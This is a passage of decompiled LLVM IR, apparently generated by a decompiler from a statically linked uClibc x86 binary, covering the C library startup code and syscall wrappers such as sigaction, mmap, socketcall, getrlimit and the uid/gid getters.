dec_label_pc_804b6c2:                             ; preds = %dec_label_pc_804b6aa, %dec_label_pc_804b6b1
  %v0_804b6c2 = phi i32 [ %v0_804b6b4, %dec_label_pc_804b6aa ], [ %v0_804b6c2.pre, %dec_label_pc_804b6b1 ]
  %v1_804b6c2 = add i32 %v0_804b6c2, 8
  store i32 %v1_804b6c2, i32* @ebx, align 4
  %v1_804b6c5 = inttoptr i32 %v1_804b6c2 to i32*
  %v2_804b6c5 = load i32, i32* %v1_804b6c5, align 4
  %v3_804b6c5 = icmp eq i32 %v2_804b6c5, 0
  %v1_804b6c8 = icmp eq i1 %v3_804b6c5, false
  br i1 %v1_804b6c8, label %dec_label_pc_804b6aa, label %dec_label_pc_804b6ca

dec_label_pc_804b6ca:                             ; preds = %dec_label_pc_804b6c2, %dec_label_pc_804b6c5.preheader
  store i32 %v2_804b68c, i32* @eax, align 4
  %v0_804b6ce = call i32 @_dl_aux_init()
  store i32 %v0_804b6ce, i32* @eax, align 4
  %v0_804b6d3 = call i32 @__GI___uClibc_init()
  %v1_804b6dc = icmp eq i32 %tmp25, 0
  %v1_804b6de = icmp eq i1 %v1_804b6dc, false
  br i1 %v1_804b6de, label %dec_label_pc_804b6e4, label %dec_label_pc_804b6e0

dec_label_pc_804b6e0:                             ; preds = %dec_label_pc_804b6ca
  %v1_804b6e0 = and i32 %tmp25, -65536
  %v2_804b6e0 = or i32 %v1_804b6e0, 4096
  br label %dec_label_pc_804b6e4

dec_label_pc_804b6e4:                             ; preds = %dec_label_pc_804b6ca, %dec_label_pc_804b6e0
  %v0_804b6e4 = phi i32 [ %tmp25, %dec_label_pc_804b6ca ], [ %v2_804b6e0, %dec_label_pc_804b6e0 ]
  store i32 %v0_804b6e4, i32* @global_var_8052510.75, align 16
  %v13_804b6e9 = icmp eq i32 %tmp24, -1
  %v1_804b6ee = icmp eq i1 %v13_804b6e9, false
  br i1 %v1_804b6ee, label %dec_label_pc_804b719, label %dec_label_pc_804b6f0

dec_label_pc_804b6f0:                             ; preds = %dec_label_pc_804b6e4
  %v0_804b6f0 = call i32 @getuid()
  store i32 %v0_804b6f0, i32* @ebx, align 4
  %v0_804b6f7 = call i32 @geteuid()
  %v0_804b6fc = load i32, i32* @ebx, align 4
  %v12_804b6fc = icmp eq i32 %v0_804b6fc, %v0_804b6f7
  %v1_804b6fe = icmp eq i1 %v12_804b6fc, false
  br i1 %v1_804b6fe, label %dec_label_pc_804b72f, label %dec_label_pc_804b700

dec_label_pc_804b700:                             ; preds = %dec_label_pc_804b6f0
  %v0_804b700 = call i32 @getgid()
  store i32 %v0_804b700, i32* @ebx, align 4
  %v0_804b707 = call i32 @getegid()
  %v0_804b70c = load i32, i32* @ebx, align 4
  %v12_804b70c = icmp eq i32 %v0_804b70c, %v0_804b707
  %v1_804b70e = icmp eq i1 %v12_804b70c, false
  br i1 %v1_804b70e, label %dec_label_pc_804b72f, label %dec_label_pc_804b710.thread

dec_label_pc_804b710.thread:                      ; preds = %dec_label_pc_804b700
  br label %dec_label_pc_804b759

dec_label_pc_804b719:                             ; preds = %dec_label_pc_804b6e4
  %v15_804b719 = icmp eq i32 %tmp24, %tmp23
  %v1_804b71d = icmp eq i1 %v15_804b719, false
  br i1 %v1_804b71d, label %dec_label_pc_804b72f, label %dec_label_pc_804b71f

dec_label_pc_804b71f:                             ; preds = %dec_label_pc_804b719
  br label %dec_label_pc_804b72f

dec_label_pc_804b72f:                             ; preds = %dec_label_pc_804b71f, %dec_label_pc_804b6f0, %dec_label_pc_804b719, %dec_label_pc_804b700
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_804b736 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_804b745 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_804b754 = call i32 @__check_one_fd()
  br label %dec_label_pc_804b759

dec_label_pc_804b759:                             ; preds = %dec_label_pc_804b710.thread, %dec_label_pc_804b72f
  store i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32* %esi.global-to-local, align 4
  %v0_804b75e = load i32, i32* @edi, align 4
  %v1_804b75e = inttoptr i32 %v0_804b75e to i32*
  %v2_804b75e = load i32, i32* %v1_804b75e, align 4
  store i32 %v2_804b75e, i32* bitcast (i32** @global_var_8052158.79 to i32*), align 8
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32 -134553600), i32 2), i32* %esi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg4, i32* @global_var_8052514.71, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32 -134553600), i32 2), i32 0), label %dec_label_pc_804b77e, label %dec_label_pc_804b7ae.critedge

dec_label_pc_804b77e:                             ; preds = %dec_label_pc_804b759, %dec_label_pc_804b77e
  %v4_804b77e47 = phi i32 [ %v1_804b785, %dec_label_pc_804b77e ], [ 0, %dec_label_pc_804b759 ]
  %v5_804b77e = mul i32 %v4_804b77e47, 4
  %v6_804b77e = add i32 %v5_804b77e, ptrtoint (i32* @global_var_8052000.69 to i32)
  %v7_804b77e = inttoptr i32 %v6_804b77e to i32*
  %v8_804b77e = load i32, i32* %v7_804b77e, align 4
  call void @__pseudo_call(i32 %v8_804b77e)
  %v0_804b785 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b785 = add i32 %v0_804b785, 1
  store i32 %v1_804b785, i32* %ebx.global-to-local, align 4
  %v1_804b786.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_804b786 = icmp ult i32 %v1_804b785, %v1_804b786.pre
  br i1 %v7_804b786, label %dec_label_pc_804b77e, label %dec_label_pc_804b78a

dec_label_pc_804b78a:                             ; preds = %dec_label_pc_804b77e
  call void @__pseudo_call(i32 %arg3)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32 -134553600), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32 -134553600), i32 2), i32 0), label %dec_label_pc_804b7a2, label %dec_label_pc_804b7ae

dec_label_pc_804b7a2:                             ; preds = %dec_label_pc_804b78a, %dec_label_pc_804b7a2
  %v4_804b7a246 = phi i32 [ %v1_804b7a9, %dec_label_pc_804b7a2 ], [ 0, %dec_label_pc_804b78a ]
  store i32 ptrtoint (i32* @global_var_804b7a9.81 to i32), i32* %stack_var_-168, align 4
  %v5_804b7a2 = mul i32 %v4_804b7a246, 4
  %v6_804b7a2 = add i32 %v5_804b7a2, ptrtoint (i32* @global_var_8052000.69 to i32)
  %v7_804b7a2 = inttoptr i32 %v6_804b7a2 to i32*
  %v8_804b7a2 = load i32, i32* %v7_804b7a2, align 4
  call void @__pseudo_call(i32 %v8_804b7a2)
  %v0_804b7a9 = load i32, i32* @ebx, align 4
  %v1_804b7a9 = add i32 %v0_804b7a9, 1
  store i32 %v1_804b7a9, i32* @ebx, align 4
  %v1_804b7aa.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_804b7aa = icmp ult i32 %v1_804b7a9, %v1_804b7aa.pre
  br i1 %v7_804b7aa, label %dec_label_pc_804b7a2, label %dec_label_pc_804b7ae

dec_label_pc_804b7ae.critedge:                    ; preds = %dec_label_pc_804b759
  call void @__pseudo_call(i32 %arg3)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32 -134553600), i32 2), i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804b7ae

dec_label_pc_804b7ae:                             ; preds = %dec_label_pc_804b7ae.critedge, %dec_label_pc_804b7a2, %dec_label_pc_804b78a
  %v0_804b7b7 = load i32, i32* %stack_var_-168, align 4
  %v1_804b7b7 = call i32 @__errno_location(i32 %v0_804b7b7)
  %v1_804b7bc = inttoptr i32 %v1_804b7b7 to i32*
  store i32 0, i32* %v1_804b7bc, align 4
  %v0_804b7cb = call i32 @__GI___h_errno_location()
  store i32 %v0_804b7cb, i32* @eax, align 4
  %v1_804b7d0 = inttoptr i32 %v0_804b7cb to i32*
  store i32 0, i32* %v1_804b7d0, align 4
  call void @__pseudo_call(i32 %v0_804b63d)
  %v0_804b7ec = load i32, i32* @eax, align 4
  %v1_804b7ef = call i32 @__GI_exit(i32 %v0_804b7ec)
  %v0_804b7f9 = load i32, i32* @ebx, align 4
  %v1_804b7f9 = inttoptr i32 %v0_804b7f9 to %sigcontext*
  %v2_804b7f9 = call i32 @sigreturn(%sigcontext* %v1_804b7f9)
  %v0_804b801 = load i32, i32* @ebx, align 4
  %v1_804b801 = inttoptr i32 %v0_804b801 to %sigcontext*
  %v2_804b801 = call i32 @sigreturn(%sigcontext* %v1_804b801)
  ret i32 %v2_804b801

; uselistorder directives
  uselistorder i32 %v1_804b7a9, { 1, 2, 0 }
  uselistorder i32 %v1_804b785, { 1, 2, 0 }
  uselistorder i32 %v2_804b6c5, { 1, 0 }
  uselistorder i32 %v1_804b6c2, { 2, 1, 0 }
  uselistorder i32 %v1_804b6a1, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804b69e, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 2, 1 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32 -134553600), i32 2), { 0, 3, 1, 5, 4, 2 }
  uselistorder i32 ()* @__check_one_fd, { 1, 0, 2 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804b7a2, { 1, 0 }
  uselistorder label %dec_label_pc_804b77e, { 1, 0 }
  uselistorder label %dec_label_pc_804b759, { 1, 0 }
  uselistorder label %dec_label_pc_804b72f, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804b6e4, { 1, 0 }
  uselistorder label %dec_label_pc_804b6c2, { 1, 0 }
  uselistorder label %dec_label_pc_804b6aa, { 1, 0 }
  uselistorder label %dec_label_pc_804b687, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_804b803 = load i32, i32* @esi, align 4
  %v0_804b804 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_804b819 = icmp eq i32* %arg2, null
  br i1 %v1_804b819, label %dec_label_pc_804b86c, label %dec_label_pc_804b81d

dec_label_pc_804b81d:                             ; preds = %entry
  %v2_804b81d = load i32, i32* %arg2, align 4
  store i32 %v2_804b81d, i32* %stack_var_-148, align 4
  %v1_804b826 = add i32 %tmp11, 4
  %v3_804b838 = bitcast i32* %stack_var_-136 to i16*
  %v4_804b838 = call i32 @memcpy(i16* %v3_804b838, i32 %v1_804b826, i32 128)
  %v1_804b83d = add i32 %tmp11, 132
  %v2_804b857 = inttoptr i32 %v1_804b83d to i8*
  %v3_804b857 = load i8, i8* %v2_804b857, align 1
  %v4_804b857 = and i8 %v3_804b857, 4
  %v5_804b857 = icmp eq i8 %v4_804b857, 0
  %v1_804b85e = icmp eq i1 %v5_804b857, false
  br i1 %v1_804b85e, label %dec_label_pc_804b86c, label %dec_label_pc_804b860

dec_label_pc_804b860:                             ; preds = %dec_label_pc_804b81d
  br label %dec_label_pc_804b86c

dec_label_pc_804b86c:                             ; preds = %dec_label_pc_804b860, %dec_label_pc_804b81d, %entry
  %v1_804b86e = icmp eq i32 %arg3, 0
  br i1 %v1_804b86e, label %dec_label_pc_804b876, label %dec_label_pc_804b872

dec_label_pc_804b872:                             ; preds = %dec_label_pc_804b86c
  %v2_804b872 = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_804b876

dec_label_pc_804b876:                             ; preds = %dec_label_pc_804b86c, %dec_label_pc_804b872
  %v0_804b885 = phi i32 [ 0, %dec_label_pc_804b86c ], [ %v2_804b872, %dec_label_pc_804b872 ]
  br i1 %v1_804b819, label %dec_label_pc_804b883, label %dec_label_pc_804b87c

dec_label_pc_804b87c:                             ; preds = %dec_label_pc_804b876
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_804b883

dec_label_pc_804b883:                             ; preds = %dec_label_pc_804b876, %dec_label_pc_804b87c
  %v0_804b886 = phi %sigaction* [ null, %dec_label_pc_804b876 ], [ %phitmp, %dec_label_pc_804b87c ]
  %v5_804b88e = call i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %v0_804b886, i32 %v0_804b885, i32 8)
  store i32 %v5_804b88e, i32* %ebx.global-to-local, align 4
  br i1 %v1_804b86e, label %dec_label_pc_804b8d1, label %dec_label_pc_804b89c

dec_label_pc_804b89c:                             ; preds = %dec_label_pc_804b883
  %v2_804b89c = icmp slt i32 %v5_804b88e, 0
  br i1 %v2_804b89c, label %dec_label_pc_804b8d1, label %dec_label_pc_804b8a0

dec_label_pc_804b8a0:                             ; preds = %dec_label_pc_804b89c
  %v3_804b8a0 = load i32, i32* %stack_var_-288, align 4
  %v2_804b8a4 = inttoptr i32 %arg3 to i32*
  store i32 %v3_804b8a0, i32* %v2_804b8a4, align 4
  %v2_804b8ac = ptrtoint i32* %stack_var_-276 to i32
  %v1_804b8b1 = add i32 %arg3, 4
  %v3_804b8b5 = inttoptr i32 %v1_804b8b1 to i16*
  %v4_804b8b5 = call i32 @memcpy(i16* %v3_804b8b5, i32 %v2_804b8ac, i32 128)
  %v2_804b8be = add i32 %arg3, 132
  %v3_804b8be = inttoptr i32 %v2_804b8be to i32*
  %v2_804b8cb = add i32 %arg3, 136
  %v3_804b8cb = inttoptr i32 %v2_804b8cb to i32*
  %v0_804b8d1.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b8d1

dec_label_pc_804b8d1:                             ; preds = %dec_label_pc_804b89c, %dec_label_pc_804b883, %dec_label_pc_804b8a0
  %v0_804b8d1 = phi i32 [ %v5_804b88e, %dec_label_pc_804b89c ], [ %v5_804b88e, %dec_label_pc_804b883 ], [ %v0_804b8d1.pre, %dec_label_pc_804b8a0 ]
  store i32 %v0_804b804, i32* @ebx, align 4
  store i32 %v0_804b803, i32* @esi, align 4
  ret i32 %v0_804b8d1

; uselistorder directives
  uselistorder i32 %v5_804b88e, { 0, 1, 3, 2 }
  uselistorder i1 %v1_804b86e, { 1, 0 }
  uselistorder i1 %v1_804b819, { 1, 0 }
  uselistorder i32* null, { 0, 3, 4, 5, 6, 1, 2, 7 }
  uselistorder i32 %arg3, { 2, 1, 4, 3, 0, 5 }
  uselistorder label %dec_label_pc_804b8d1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b883, { 1, 0 }
  uselistorder label %dec_label_pc_804b876, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v0_804b8dc = load i32, i32* @ebx, align 4
  %v2_804b8e3 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_804b8e3, i32* @ebx, align 4
  %v8_804b8e7 = call i32 @mmap(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_804b8dc, i32* @ebx, align 4
  %v3_804b8f0 = icmp ugt i32 %v8_804b8e7, -4096
  call void @__pseudo_cond_branch(i1 %v3_804b8f0, i32 134531096)
  ret i32 %v8_804b8e7

; uselistorder directives
  uselistorder i32 %v8_804b8e7, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @mmap, { 2, 1, 0 }
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b8f8 = load i32, i32* @ebx, align 4
  store i32 %v0_804b8f8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804b90b = call i32 @int80_syscall(i32 102)
  store i32 %v1_804b90b, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_804b90b, -4095
  br i1 %tmp8, label %dec_label_pc_804b924, label %dec_label_pc_804b918

dec_label_pc_804b918:                             ; preds = %entry
  %v0_804b918 = load i32, i32* %stack_var_-4, align 4
  %v1_804b918 = call i32 @__errno_location(i32 %v0_804b918)
  %v0_804b91d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b91d = sub i32 0, %v0_804b91d
  %v2_804b91f = inttoptr i32 %v1_804b918 to i32*
  store i32 %v1_804b91d, i32* %v2_804b91f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b924

dec_label_pc_804b924:                             ; preds = %entry, %dec_label_pc_804b918
  %v0_804b924 = phi i32 [ %v1_804b90b, %entry ], [ -1, %dec_label_pc_804b918 ]
  %v2_804b926 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804b926, i32* @edx, align 4
  %v2_804b928 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b928, i32* @ebx, align 4
  ret i32 %v0_804b924

; uselistorder directives
  uselistorder i32 %v1_804b90b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b924, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_804b92d = load i32, i32* @esi, align 4
  store i32 %v0_804b92d, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804b941 = load i32, i32* @ebx, align 4
  %v7_804b949 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_804b949, i32* %esi.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_804b949, -4095
  br i1 %tmp13, label %dec_label_pc_804b961, label %dec_label_pc_804b955

dec_label_pc_804b955:                             ; preds = %entry
  %v1_804b955 = call i32 @__errno_location(i32 %v0_804b941)
  %v0_804b95a = load i32, i32* %esi.global-to-local, align 4
  %v1_804b95a = sub i32 0, %v0_804b95a
  %v2_804b95c = inttoptr i32 %v1_804b955 to i32*
  store i32 %v1_804b95a, i32* %v2_804b95c, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804b961

dec_label_pc_804b961:                             ; preds = %entry, %dec_label_pc_804b955
  %v0_804b961 = phi i32 [ %v7_804b949, %entry ], [ -1, %dec_label_pc_804b955 ]
  %v2_804b964 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804b964, i32* @esi, align 4
  ret i32 %v0_804b961

; uselistorder directives
  uselistorder i32 %v7_804b949, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b961, { 1, 0 }
}

define i32 @__GI_clock_getres(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b968 = load i32, i32* @ebx, align 4
  store i32 %v0_804b968, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_804b97b = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_804b97b, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v4_804b97b, -4095
  br i1 %tmp9, label %dec_label_pc_804b994, label %dec_label_pc_804b988

dec_label_pc_804b988:                             ; preds = %entry
  %v0_804b988 = load i32, i32* %stack_var_-4, align 4
  %v1_804b988 = call i32 @__errno_location(i32 %v0_804b988)
  %v0_804b98d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b98d = sub i32 0, %v0_804b98d
  %v2_804b98f = inttoptr i32 %v1_804b988 to i32*
  store i32 %v1_804b98d, i32* %v2_804b98f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b994

dec_label_pc_804b994:                             ; preds = %entry, %dec_label_pc_804b988
  %v0_804b994 = phi i32 [ %v4_804b97b, %entry ], [ -1, %dec_label_pc_804b988 ]
  %v2_804b996 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804b996, i32* @edx, align 4
  %v2_804b998 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b998, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804b994

; uselistorder directives
  uselistorder i32 %v4_804b97b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804b994, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804b99f = ptrtoint i32* %stack_var_-8 to i32
  %v2_804b9a6 = call i32 @getrlimit(i32 7, i32 %v2_804b99f)
  store i32 256, i32* @edx, align 4
  %v2_804b9b3 = icmp slt i32 %v2_804b9a6, 0
  br i1 %v2_804b9b3, label %dec_label_pc_804b9bb, label %dec_label_pc_804b9b7

dec_label_pc_804b9b7:                             ; preds = %entry
  %v3_804b9b7 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_804b9b7, i32* @edx, align 4
  br label %dec_label_pc_804b9bb

dec_label_pc_804b9bb:                             ; preds = %entry, %dec_label_pc_804b9b7
  %v0_804b9bb = phi i32 [ 256, %entry ], [ %v3_804b9b7, %dec_label_pc_804b9b7 ]
  ret i32 %v0_804b9bb

; uselistorder directives
  uselistorder label %dec_label_pc_804b9bb, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b9c4 = load i32, i32* @ebx, align 4
  store i32 %v0_804b9c4, i32* %stack_var_-4, align 4
  %v1_804b9cd = call i32 @int80_syscall(i32 202)
  store i32 %v1_804b9cd, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804b9cd, -4095
  br i1 %tmp6, label %dec_label_pc_804b9e4, label %dec_label_pc_804b9d8

dec_label_pc_804b9d8:                             ; preds = %entry
  %v0_804b9d8 = load i32, i32* %stack_var_-4, align 4
  %v1_804b9d8 = call i32 @__errno_location(i32 %v0_804b9d8)
  %v0_804b9dd = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b9dd = sub i32 0, %v0_804b9dd
  %v2_804b9df = inttoptr i32 %v1_804b9d8 to i32*
  store i32 %v1_804b9dd, i32* %v2_804b9df, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b9e4

dec_label_pc_804b9e4:                             ; preds = %entry, %dec_label_pc_804b9d8
  %v0_804b9e4 = phi i32 [ %v1_804b9cd, %entry ], [ -1, %dec_label_pc_804b9d8 ]
  %v2_804b9e8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b9e8, i32* @ebx, align 4
  ret i32 %v0_804b9e4

; uselistorder directives
  uselistorder i32 %v1_804b9cd, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b9e4, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b9ec = load i32, i32* @ebx, align 4
  store i32 %v0_804b9ec, i32* %stack_var_-4, align 4
  %v1_804b9f5 = call i32 @int80_syscall(i32 201)
  store i32 %v1_804b9f5, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804b9f5, -4095
  br i1 %tmp6, label %dec_label_pc_804ba0c, label %dec_label_pc_804ba00

dec_label_pc_804ba00:                             ; preds = %entry
  %v0_804ba00 = load i32, i32* %stack_var_-4, align 4
  %v1_804ba00 = call i32 @__errno_location(i32 %v0_804ba00)
  %v0_804ba05 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ba05 = sub i32 0, %v0_804ba05
  %v2_804ba07 = inttoptr i32 %v1_804ba00 to i32*
  store i32 %v1_804ba05, i32* %v2_804ba07, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ba0c

dec_label_pc_804ba0c:                             ; preds = %entry, %dec_label_pc_804ba00
  %v0_804ba0c = phi i32 [ %v1_804b9f5, %entry ], [ -1, %dec_label_pc_804ba00 ]
  %v2_804ba10 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ba10, i32* @ebx, align 4
  ret i32 %v0_804ba0c

; uselistorder directives
  uselistorder i32 %v1_804b9f5, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ba0c, { 1, 0 }
}

define i32 @getgid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ba14 = load i32, i32* @ebx, align 4
  store i32 %v0_804ba14, i32* %stack_var_-4, align 4
  %v1_804ba1d = call i32 @int80_syscall(i32 200)
  store i32 %v1_804ba1d, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804ba1d, -4095
  br i1 %tmp6, label %dec_label_pc_804ba34, label %dec_label_pc_804ba28

dec_label_pc_804ba28:                             ; preds = %entry
  %v0_804ba28 = load i32, i32* %stack_var_-4, align 4
  %v1_804ba28 = call i32 @__errno_location(i32 %v0_804ba28)
  %v0_804ba2d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ba2d = sub i32 0, %v0_804ba2d
  %v2_804ba2f = inttoptr i32 %v1_804ba28 to i32*
  store i32 %v1_804ba2d, i32* %v2_804ba2f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ba34

dec_label_pc_804ba34:                             ; preds = %entry, %dec_label_pc_804ba28
  %v0_804ba34 = phi i32 [ %v1_804ba1d, %entry ], [ -1, %dec_label_pc_804ba28 ]
  %v2_804ba38 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ba38, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804ba34

; uselistorder directives
  uselistorder i32 %v1_804ba1d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ba34, { 1, 0 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v0_804ba3c = load i32, i32* @global_var_8052510.75, align 16
  %v1_804ba46 = icmp eq i32 %v0_804ba3c, 0
  br i1 %v1_804ba46, label %dec_label_pc_804ba4c, label %dec_label_pc_804ba4a

dec_label_pc_804ba4a:                             ; preds = %entry
  br label %dec_label_pc_804ba4c

dec_label_pc_804ba4c:                             ; preds = %entry, %dec_label_pc_804ba4a
  %storemerge = phi i32 [ %v0_804ba3c, %dec_label_pc_804ba4a ], [ 4096, %entry ]
  %v0_804ba4c = phi i32 [ %v0_804ba3c, %dec_label_pc_804ba4a ], [ 4096, %entry ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_804ba4c

; uselistorder directives
  uselistorder label %dec_label_pc_804ba4c, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ba50 = load i32, i32* @ebx, align 4
  store i32 %v0_804ba50, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804ba63 = call i32 @int80_syscall(i32 191)
  store i32 %v1_804ba63, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_804ba63, -4095
  br i1 %tmp8, label %dec_label_pc_804ba7c, label %dec_label_pc_804ba70

dec_label_pc_804ba70:                             ; preds = %entry
  %v0_804ba70 = load i32, i32* %stack_var_-4, align 4
  %v1_804ba70 = call i32 @__errno_location(i32 %v0_804ba70)
  %v0_804ba75 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ba75 = sub i32 0, %v0_804ba75
  %v2_804ba77 = inttoptr i32 %v1_804ba70 to i32*
  store i32 %v1_804ba75, i32* %v2_804ba77, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ba7c

dec_label_pc_804ba7c:                             ; preds = %entry, %dec_label_pc_804ba70
  %v0_804ba7c = phi i32 [ %v1_804ba63, %entry ], [ -1, %dec_label_pc_804ba70 ]
  %v2_804ba80 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ba80, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804ba7c

; uselistorder directives
  uselistorder i32 %v1_804ba63, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ba7c, { 1, 0 }
}

